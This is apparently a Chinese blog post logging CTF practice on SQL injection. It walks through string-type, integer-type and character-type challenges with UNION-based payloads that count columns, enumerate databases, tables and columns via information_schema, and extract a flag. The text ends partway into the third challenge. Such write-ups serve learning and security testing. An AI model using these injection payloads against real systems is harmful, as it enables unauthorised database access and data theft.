---
uuid: 6d1ec04e-eb46-2803-7217-91f392ee21d0
title: SQL注入
date: 2022-02-04 19:27:40
tags: 
      - SQL
      - Web
      - CTF
categories: 
      - [Web]
      - [CTF]
---

**关于SQL的刷题记录**
# SQL注入

<!--more-->

![image-20220204192950568](https://img-blog.csdnimg.cn/img_convert/f1ffa70adef3130ddf24b0e19484597f.png)

首先查看源码发现name为id，并且是post传参

![image-20220204193042721](https://img-blog.csdnimg.cn/img_convert/a9e5b7fd180fd339add29d1a494e6299.png)

用hackbar查查有几个数据，发现只有三个

测试发现当post内容加`‘`时，内容就显示不出来

![image-20220204193404946](https://img-blog.csdnimg.cn/img_convert/4e578d6f3c727fa95cfdb3516fef3b71.png)

而加`’#`，发现又正常显示

![image-20220204193459549](https://img-blog.csdnimg.cn/img_convert/a0e1c557c7d6ae4720e5a2a0de721995.png)

这个题完全就是考察SQL注入，这个题目前来看有两种解决方法，在这里记录一下。

## 第一种解决方法

首先先说点知识，1、MySql在5.0版本后新增一个叫`information_schema`的虚拟数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。利用这个可以获取表名，列名等
2、查询中用到的`group_concat()`函数是要把查询的内容联合到一起方便查看的，这样就不需要limit 0,1一个一个判断了
先查个字段，因为有三个数据，就用4吧`order by 4#`

![image-20220204193859153](https://img-blog.csdnimg.cn/img_convert/62cdc02c1da1138cbe7d60e20b964406.png)

显示依然正常，那再试试5

![image-20220204193934206](https://img-blog.csdnimg.cn/img_convert/445c63257452df78a065a1fda32eba15.png)

这个时候发现没有返回值，所以可以确定字段就是四个，接下来，爆库名`id=-1' union select 1，2，3，4#`，把id变为-1是因为如果id有回显的话，我们查询的内容就不能显示了，所以要换一个id没有内容的值

![image-20220204194415205](https://img-blog.csdnimg.cn/img_convert/3bc76f82edb6870a2ca2d964f10be9ce.png)

这样就知道每一个数值所在的位置，然后开始爆库，`id=-1' union select 1,database(),user(),version()#`,这个有必要说明一下，database（）是查询当前数据库名，user（）是为了查询当前用户名，version（）是为了查询数据库版本

![image-20220204194828472](https://img-blog.csdnimg.cn/img_convert/a2d95a6cab964cfb08e73e4e3ff4e7f5.png)

然后爆表名，这个是固定格式，`id=-1' union select 1,group_concat(table_name),user(),version() from information_schema.tables where table_schema=database()#`,得到两个表名fl4g，sc

![image-20220204200949037](https://img-blog.csdnimg.cn/img_convert/4667d7a2fd4633e35420005775316a63.png)

再然后爆列明，`id=-1' union select 1,group_concat(column_name),user(),version() from information_schema.columns where table_name='fl4g'#`

![image-20220204201124534](https://img-blog.csdnimg.cn/img_convert/a5aa4f619736882f29fe0cf3972067d2.png)

得到列名skctf_flag

> 表明单引号要用英文的''，当然不加也可以，但是表名要用十六进制

最后一步就是查询想要的数据了

![image-20220204201353733](https://img-blog.csdnimg.cn/img_convert/a48620af1763c15138bda9d8a06354b7.png)

得到flag

## 第二种解决方法

sqlmap跑，目前还在了解，学会了再更！！

# 整数型注入

![image-20220215171031084](https://img-blog.csdnimg.cn/img_convert/d7379c21e5b2e9065425123e62b32895.png)

当输入1时发现有回显，并且url也发生变化

![image-20220215171141632](https://img-blog.csdnimg.cn/img_convert/5072482b3a6aae1cb78915199ddb0f3d.png)

使用order by语句查询字段数

![image-20220215171256788](https://img-blog.csdnimg.cn/img_convert/1c3d4a8429e8c5aa49636ff202bfe09f.png)

![image-20220215171320208](https://img-blog.csdnimg.cn/img_convert/ae016b3da50d2e14dc650e2bc35defe5.png)

当输入3的时候发现没有回显，说明只有俩个字段数据。

使用[union](https://so.csdn.net/so/search?q=union&spm=1001.2101.3001.7020)联合查询检测信息回显位置

```javascript
id=1 union select 1,2
```

![image-20220215171433860](https://img-blog.csdnimg.cn/img_convert/572dfa904d048d2b681920aa36232f0b.png)

发现并不可以，由于页面只允许返回一行内容，可以修改参数为-1，使得需要查询的数据回显。![image-20220215171608940](https://img-blog.csdnimg.cn/img_convert/6646d4d40d422a8f45f417b4646e9bff.png)

输入一下来获取当前数据库名


```
id=-1 union select 1,database()
```

![image-20220215171752124](https://img-blog.csdnimg.cn/img_convert/ab60b7ccbe913e75ade17050d06b68c4.png)

输入一下获取所有数据库名

```
id=-1 union select 1,group_concat(schema_name)from information_schema.schemata
```

![image-20220215171840187](https://img-blog.csdnimg.cn/img_convert/84d84f9386583aed2220619a21378bdf.png)

输入一下查询数据库sqli表名

```
id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'
```

![image-20220215171942844](https://img-blog.csdnimg.cn/img_convert/335760043d8e946a7423cadd1e0dec61.png)

输入以下获取flag的所有字段名

```
id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'

```

![image-20220215172155435](https://img-blog.csdnimg.cn/img_convert/7e55d70f1fd3fb4b5d4fe6cff9a1d51a.png)

输入以下获取指定数据库的表的列的内容

```
id=-1 union select 1,group_concat(flag) from sqli.flag
```

![image-20220215172245055](https://img-blog.csdnimg.cn/img_convert/ba62495591bd481478c051696840c425.png)

得到flag！

# 字符型注入

![image-20220215172440795](https://img-blog.csdnimg.cn/img_convert/08817b1d06ad9ec837ab7fafcc10344c.png)

测试后发现和上边的那个整形注入一样，只有两个数据。回显只有两处：ID和Data。

联合查询

```
123’ union select database(),2 #
```

